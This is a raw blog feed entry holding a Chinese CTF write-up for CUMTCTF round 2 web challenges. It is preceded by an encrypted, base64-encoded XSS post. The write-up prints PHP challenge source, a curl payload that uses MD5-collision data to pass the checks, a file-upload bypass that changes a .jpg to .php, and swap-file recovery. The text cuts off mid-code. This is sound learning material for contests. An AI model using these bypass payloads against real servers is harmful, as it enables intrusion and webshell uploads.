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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="XSS" scheme="http://chaosec.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF第二轮月赛</title>
    <link href="http://chaosec.top/2019/01/30/cumtctf2/"/>
    <id>http://chaosec.top/2019/01/30/cumtctf2/</id>
    <published>2019-01-30T14:50:00.000Z</published>
    <updated>2019-02-12T14:29:27.946Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。</p><a id="more"></a><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$white_list = range(<span class="number">0</span>,<span class="number">9</span>); </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver2'</span>]))&#123; </span><br><span class="line">    $a = $_REQUEST[<span class="string">'0ver'</span>]; </span><br><span class="line">    $b = $_REQUEST[<span class="string">'0ver1'</span>]; </span><br><span class="line">    $c = $_REQUEST[<span class="string">'0ver2'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(@ereg(<span class="string">"^[0-9]+$"</span>, $a) === <span class="keyword">FALSE</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no must be number'</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($a,$white_list))&#123; </span><br><span class="line">            <span class="keyword">if</span>(strlen($a)&gt;<span class="number">1</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span>(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;img src='dark.png'&gt;&lt;br&gt;"</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'you are a great dark phper&lt;br&gt;'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> $flag; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span>&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"you can do it!!!"</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                 </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'you no dark'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'you are so dark'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>很简单的代码审计题目，第一次绕过要求0ver是数字0-9以内的整数，但是长度却要大于1位，使用 <code>03</code>类似的即可绕过，也可以使用<code>%00</code>截断，第二层要求两个相同md5值的文件（不是弱类型比较），这样的文件也是有的，记得强网杯好像就有类似的题目，参考一下即可</p><p>paylaod：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://202.119.201.199:32790?0ver=02 --data &quot;0ver1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;0ver2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:flag&#123;73100259ca8919f402846b00d3b939a9&#125;</span><br></pre></td></tr></table></figure><h2 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h2><p>查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。</p><p>这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。</p><p><img src="https://i.imgur.com/kDxBrxT.png" alt="">    </p><h2 id="小型线上赌场"><a href="#小型线上赌场" class="headerlink" title="小型线上赌场"></a>小型线上赌场</h2><p>题目提示了断电，应该是vi文件泄露，测试发现 <code>.index.swp</code>存在泄露，vim恢复一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi -r index.swp</span><br></pre></td></tr></table></figure><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $invest = $_GET[<span class="string">'invest'</span>];</span><br><span class="line">    $rand = rand(<span class="number">2</span>,<span class="number">50</span>);</span><br><span class="line">    $len = strlen(trim($_GET[<span class="string">'invest'</span>]));</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($value)||$value == <span class="string">'0'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'no no no!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $money = number_format($invest*$rand);</span><br><span class="line">    $money = intval(str_replace(<span class="string">','</span>,<span class="string">''</span>,$money));</span><br><span class="line">    $guess = intval($_GET[<span class="string">'guess'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span 